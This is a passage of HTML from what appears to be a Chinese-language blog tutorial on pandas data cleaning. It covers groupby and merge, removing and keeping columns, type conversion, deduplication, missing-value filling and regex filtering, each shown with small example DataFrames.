string">'白菜'</span><span class="token punctuation">,</span><span class="token string">'冬瓜'</span><span class="token punctuation">,</span><span class="token string">'辣椒'</span><span class="token punctuation">,</span><span class="token string">'冬瓜'</span><span class="token punctuation">,</span><span class="token string">'白菜'</span><span class="token punctuation">,</span><span class="token string">'萝卜'</span><span class="token punctuation">,</span><span class="token string">'辣椒'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token string">'price'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2.8</span><span class="token punctuation">,</span><span class="token number">3.5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               <span class="token string">'color'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               <span class="token string">'weight'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">)</span><span class="token builtin">sum</span> <span class="token operator">=</span> df1<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'color'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'price'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">)</span>weight_sum <span class="token operator">=</span> df1<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'item'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'weight'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>price_mean <span class="token operator">=</span> df1<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'item'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'price'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>weight_sum<span class="token punctuation">,</span>price_mean<span class="token punctuation">)</span><span class="token comment"># 先跟总重量合并</span>r1 <span class="token operator">=</span> pd<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>df1<span class="token punctuation">,</span>DataFrame<span class="token punctuation">(</span>weight_sum<span class="token punctuation">)</span><span class="token punctuation">,</span>how<span class="token operator">=</span><span class="token string">'outer'</span><span class="token punctuation">,</span>left_on<span class="token operator">=</span><span class="token string">'item'</span><span class="token punctuation">,</span>right_index<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>suffixes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'_sum'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 跟平均价格合并</span>r2 <span class="token operator">=</span> pd<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>r1<span class="token punctuation">,</span>DataFrame<span class="token punctuation">(</span>price_mean<span class="token punctuation">)</span><span class="token punctuation">,</span>how<span class="token operator">=</span><span class="token string">'outer'</span><span class="token punctuation">,</span>left_on<span class="token operator">=</span><span class="token string">'item'</span><span class="token punctuation">,</span>right_index<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>suffixes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'_mean'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据清洗"><a href="#数据清洗" class="headerlink" title="数据清洗"></a>数据清洗</h3><p>有两种丢失数据：</p><ol><li>None<br>None是Python自带的，其类型为python object。因此，None不能参与到任何计算中。</li><li>np.nan（NaN）<br>np.nan是浮点类型，能参与到计算中。但计算的结果总是NaN。<br>但可以使用np.nan()函数来计算nan，此时视nan为0。</li></ol><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>df.info()</td><td>查看摘要信息</td></tr><tr><td>df.describe()</td><td>查看描述信息</td></tr><tr><td>df.isna()/df.notnull() &amp;&amp; df.isnull() /df.notnull()</td><td>查找缺失值</td></tr><tr><td>df.dropna(subset=[‘列名’])</td><td>如果有缺失值，删除整行（可指定操作的列）</td></tr><tr><td>df.duplicated()</td><td>查找重复值</td></tr><tr><td>df.drop_duplicates()</td><td>删除重复值</td></tr><tr><td>df.fillna()</td><td>填充缺失值</td></tr><tr><td>df.sort_values(by=’列名’)</td><td>对某列数据进行排序</td></tr><tr><td>df.astype(int/str)</td><td>数据类型转换</td></tr><tr><td>df.drop([],axis=1)</td><td>删除行列数据（axis指定行或者列）</td></tr><tr><td>df[[‘A’, ‘B’]]</td><td>只保留列索引为’A’,’B’的列</td></tr><tr><td>df.reset_index(drop=True)</td><td>重置原来的索引</td></tr><tr><td>df.set_index(‘A’)</td><td>添加新索引</td></tr></tbody></table><h4 id="查看描述信息"><a href="#查看描述信息" class="headerlink" title="查看描述信息"></a>查看描述信息</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'item'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'苹果'</span><span class="token punctuation">,</span><span class="token string">'香蕉'</span><span class="token punctuation">,</span><span class="token string">'橘子'</span><span class="token punctuation">,</span><span class="token string">'香蕉'</span><span class="token punctuation">,</span><span class="token string">'橘子'</span><span class="token punctuation">,</span><span class="token string">'苹果'</span><span class="token punctuation">,</span><span class="token string">'苹果'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token string">'price'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2.8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               <span class="token string">'color'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'yello'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               <span class="token string">'weight'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment"># 使用describe()函数查看每一列的描述性统计量</span>df<span class="token punctuation">.</span>describe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>describe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'mean'</span><span class="token punctuation">,</span><span class="token string">'price'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="列的筛选与保留"><a href="#列的筛选与保留" class="headerlink" title="列的筛选与保留"></a>列的筛选与保留</h4><p><strong>删除行列数据：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'item'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'苹果'</span><span class="token punctuation">,</span><span class="token string">'香蕉'</span><span class="token punctuation">,</span><span class="token string">'橘子'</span><span class="token punctuation">,</span><span class="token string">'香蕉'</span><span class="token punctuation">,</span><span class="token string">'橘子'</span><span class="token punctuation">,</span><span class="token string">'苹果'</span><span class="token punctuation">,</span><span class="token string">'苹果'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token string">'price'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2.8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               <span class="token string">'color'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'yello'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               <span class="token string">'weight'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 删除指定列</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>drop<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'item'</span><span class="token punctuation">,</span><span class="token string">'weight'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 删除指定行（不支持切片）</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>drop<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>保留指定列：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'item'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'苹果'</span><span class="token punctuation">,</span><span class="token string">'香蕉'</span><span class="token punctuation">,</span><span class="token string">'橘子'</span><span class="token punctuation">,</span><span class="token string">'香蕉'</span><span class="token punctuation">,</span><span class="token string">'橘子'</span><span class="token punctuation">,</span><span class="token string">'苹果'</span><span class="token punctuation">,</span><span class="token string">'苹果'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token string">'price'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2.8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               <span class="token string">'color'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'yello'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               <span class="token string">'weight'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 保留指定列</span>df <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'item'</span><span class="token punctuation">,</span><span class="token string">'price'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'姓名'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'林某某'</span><span class="token punctuation">,</span> <span class="token string">'许放羊'</span><span class="token punctuation">,</span> <span class="token string">'王鱼'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'语文'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'数学'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'英语'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'89'</span><span class="token punctuation">,</span> <span class="token string">'95'</span><span class="token punctuation">,</span> <span class="token string">'95'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment"># 计算每个人三门科目的总分</span>data<span class="token punctuation">[</span><span class="token string">'总分'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">]</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token string">'数学'</span><span class="token punctuation">]</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token string">'英语'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>astype<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>练习:计算总额</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 总额 = 单价 x 数量</span>data <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'商品名'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'猪头皮'</span><span class="token punctuation">,</span> <span class="token string">'醋'</span><span class="token punctuation">,</span> <span class="token string">'高压锅'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'单价'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">800</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'数量'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'总额'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'单价'</span><span class="token punctuation">]</span> <span class="token operator">*</span> data<span class="token punctuation">[</span><span class="token string">'数量'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>astype<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="数据筛选"><a href="#数据筛选" class="headerlink" title="数据筛选"></a>数据筛选</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'姓名'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'林某某'</span><span class="token punctuation">,</span> <span class="token string">'许放羊'</span><span class="token punctuation">,</span> <span class="token string">'王鱼'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'语文'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'数学'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'英语'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'89'</span><span class="token punctuation">,</span> <span class="token string">'95'</span><span class="token punctuation">,</span> <span class="token string">'95'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment"># 筛选语文大于80的</span>data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="删除重复元素"><a href="#删除重复元素" class="headerlink" title="删除重复元素"></a>删除重复元素</h4><p>使用duplicated()函数检测重复的行，返回元素为布尔类型的Series对象，每个元素对应一行，如果该行不是第一次出现，则元素为True</p><ul><li>使用drop_duplicates()函数删除重复的行</li><li>使用duplicate()函数查看重复的行</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token string">'lucy'</span><span class="token punctuation">,</span><span class="token string">'mery'</span><span class="token punctuation">,</span><span class="token string">'dancer'</span><span class="token punctuation">,</span><span class="token string">'jack'</span><span class="token punctuation">,</span><span class="token string">'dancer'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'score'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">}</span>score <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>score<span class="token punctuation">)</span><span class="token comment"># 查找重复列</span><span class="token keyword">print</span><span class="token punctuation">(</span>score<span class="token punctuation">[</span>score<span class="token punctuation">.</span>duplicated<span class="token punctuation">(</span>subset<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'score'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># keep指定保留第一个还是最后一个，first保留第一个，last保留最后一个</span><span class="token comment"># inplace True:修改数据的原始结构，Fasle不修改原始结构，产生新数据</span><span class="token comment"># subset表示要对哪些列进去去重，如果不写默认为第一列</span>score1 <span class="token operator">=</span> score<span class="token punctuation">.</span>drop_duplicates<span class="token punctuation">(</span>keep<span class="token operator">=</span><span class="token string">'last'</span><span class="token punctuation">,</span>inplace<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>subset<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'score'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>score1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="处理缺失值"><a href="#处理缺失值" class="headerlink" title="处理缺失值"></a>处理缺失值</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span>size <span class="token operator">=</span> <span class="token number">5</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>columns<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'ABCDE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>nandf<span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>nandf<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>nan<span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># axis=0：index/行,axis=1：columns/列,默认为行</span><span class="token comment"># how='all'表示一行中全为空才过滤,'any'表示有一个为空就过滤整行</span>df1 <span class="token operator">=</span> df<span class="token punctuation">.</span>dropna<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>how<span class="token operator">=</span><span class="token string">'all'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">)</span><span class="token comment"># 对缺失的数据补0</span>df2 <span class="token operator">=</span> df<span class="token punctuation">.</span>fillna<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df2<span class="token punctuation">)</span><span class="token comment"># 对指定列补指定的值</span>df3 <span class="token operator">=</span> df<span class="token punctuation">.</span>fillna<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df3<span class="token punctuation">)</span><span class="token comment"># 用前面的值来填充，axis可以控制填充的方向</span>df4 <span class="token operator">=</span> df<span class="token punctuation">.</span>ffill<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df4<span class="token punctuation">)</span><span class="token comment"># 用后面的值来填充</span>df5 <span class="token operator">=</span> df<span class="token punctuation">.</span>bfill<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df5<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="过滤掉没用的行"><a href="#过滤掉没用的行" class="headerlink" title="过滤掉没用的行"></a>过滤掉没用的行</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'John'</span><span class="token punctuation">,</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'Email'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'john@123.com'</span><span class="token punctuation">,</span> <span class="token string">'alice@example.com'</span><span class="token punctuation">,</span> <span class="token string">'bob@example.com'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment"># 使用正则表达式过滤字符串</span>pattern <span class="token operator">=</span> <span class="token string">r'example'</span>  <span class="token comment"># 过滤包含"example"的字符串</span>filtered_data <span class="token operator">=</span> df<span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token string">'Email'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>contains<span class="token punctuation">(</span>pattern<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>filtered_data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="过滤掉每一行中没用的字符串"><a href="#过滤掉每一行中没用的字符串" class="headerlink" title="过滤掉每一行中没用的字符串"></a>过滤掉每一行中没用的字符串</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 创建示例DataFrame</span>data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'John'</span><span class="token punctuation">,</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'Email'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'john@example.com'</span><span class="token punctuation">,</span> <span class="token string">'alice@example.com'</span><span class="token punctuation">,</span> <span class="token string">'bob@example.com'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment"># 使用正则表达式提取特定部分</span>pattern <span class="token 